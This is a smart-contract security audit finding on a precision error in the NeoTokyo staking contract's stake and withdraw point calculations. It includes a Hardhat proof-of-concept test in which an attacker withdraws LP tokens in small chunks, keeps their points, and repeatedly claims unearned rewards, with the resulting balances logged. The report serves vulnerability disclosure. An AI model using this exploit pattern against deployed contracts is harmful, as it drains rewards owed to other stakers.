# Findings

## [H-01] - Critical Calculation error of points variable in Stake and Withdraw of LP Tokens

### Impact
When staking and withdrawing, the points variable is calculated using a formula. However, this formula can cause 2 problems in both stake and withdraw functions.
1.Withdrawing tokens less than 10^16 will not update the pool.totalPoints variable(since points is 0). Attackers can easily make use of this for getting more rewards.
2.Staking LP tokens of anything less than 10^16 will not accrue rewards.

### Proof of Concept
https://github.com/code-423n4/2023-03-neotokyo/blob/dfa5887062e47e2d0c801ef33062d44c09f6f36e/contracts/staking/NeoTokyoStaker.sol#L1155
https://github.com/code-423n4/2023-03-neotokyo/blob/dfa5887062e47e2d0c801ef33062d44c09f6f36e/contracts/staking/NeoTokyoStaker.sol#L1623

Let's discuss both the problems in detail-

1. Attack scenario which can lead to the attacker accruing excess funds
Let's see how an attacker can profit from some tokens:-
1.The attacker will first stake an amount of 0.05 * 10^18 LP tokens for 30 days
2.Then he waits for 30 days and withdraws 0.005 * 10^18 of tokens in 10 different transactions.
3.Theoretically, the attacker should have taken all of his amounts but due to the bug where pool.totalPoints is not updated correctly, the system will still show as 5 points for the attacker
4.Now, the attacker can simply call getReward() whenever he wants to and get free tokens.

Here's the test which proves my theory:-

it.only("Critical Precision error in stake and Withdraw", async () => {

			// Bob is the attacker
			// Bob stakes his LP tokens.
			await NTStaking.connect(bob.signer).stake(
				ASSETS.LP.id,
				TIMELOCK_OPTION_IDS['30'],
				ethers.utils.parseEther('0.05'),
				0,
				0
			);

			let priorBlockNumber = await ethers.provider.getBlockNumber();
			let priorBlock = await ethers.provider.getBlock(priorBlockNumber);
			let bobStakeTime = priorBlock.timestamp;
			let jumpTime = bobStakeTime + (60 * 60 * 24 * 30)
			await ethers.provider.send('evm_setNextBlockTimestamp', [
				jumpTime
			]);

			console.log("Bob Balance Before", Number(await NTBytes2_0.balanceOf(bob.address))/10**18)

			// removes his staked tokens slowly one by one
			for(let i =1; i<=10; i++){
				await NTStaking.connect(bob.signer).withdraw(
					ASSETS.LP.id,
					ethers.utils.parseEther('0.005')
				);
			}

			// Waits again for 30 days
			await ethers.provider.send('evm_setNextBlockTimestamp', [
				jumpTime + (60 * 60 * 24 * 30)
			]);

			console.log("Bob Balance after withdrawing all this LP tokens", Number(await NTBytes2_0.balanceOf(bob.address))/10**18)

			// Withdraws his rewards
			await NTCitizenDeploy.connect(bob.signer).getReward();

			console.log("Bob Balance After claiming reward", Number(await NTBytes2_0.balanceOf(bob.address))/10**18)

			// Again waits
			await ethers.provider.send('evm_setNextBlockTimestamp', [
				jumpTime + (60 * 60 * 24 * 60)
			]);

			// Again Withdraws
			await NTCitizenDeploy.connect(bob.signer).getReward();

			console.log("Bob Balance After claiming reward AGAIN after 30 days", Number(await NTBytes2_0.balanceOf(bob.address))/10**18)

		})
Here's the output

Testing BYTES 2.0 & Neo Tokyo Staker
    with example configuration
Bob Balance Before 6843
Bob Balance after withdrawing all this LP tokens 8298.005052083332
Bob Balance After claiming reward 9752.999999999996
Bob Balance After claiming reward AGAIN after 30 days 11207.999999999995
      √ Critical Precision error in stake and Withdraw
2.Now lets look at the second problem
The problem here is again with the points variable not calculated properly leading to a problem where any tokens less than 10^16 will not be able to accrue rewards
Let's confirm this with a test:-

it.only("Staking LP tokens less than 10**16 will not accrue rewards", async () => {

			// Bob stakes his LP tokens.
			await NTStaking.connect(bob.signer).stake(
				ASSETS.LP.id,
				TIMELOCK_OPTION_IDS['30'],
				ethers.utils.parseEther('0.009'),
				0,
				0
			);

			let priorBlockNumber = await ethers.provider.getBlockNumber();
			let priorBlock = await ethers.provider.getBlock(priorBlockNumber);
			let bobStakeTime = priorBlock.timestamp;
			await ethers.provider.send('evm_setNextBlockTimestamp', [
				bobStakeTime + (60 * 60 * 24 * 30)
			]);

			const balanceBefore = await NTBytes2_0.balanceOf(bob.address);

			await NTStaking.connect(bob.signer).withdraw(
				ASSETS.LP.id,
				ethers.utils.parseEther('0.009')
			);
			
			const balanceAfter = await NTBytes2_0.balanceOf(bob.address);
			expect(balanceAfter).to.eq(balanceBefore);

		})
And here's the output:-

Testing BYTES 2.0 & Neo Tokyo Staker
    with example configuration
      √ Staking LP tokens less than 10**16 will not accrue rewards

### Tools Used
Hardhat

### Recommended Mitigation Steps
Need to find a way to correctly calculate the points (for rewards) in stake and withdraw functions.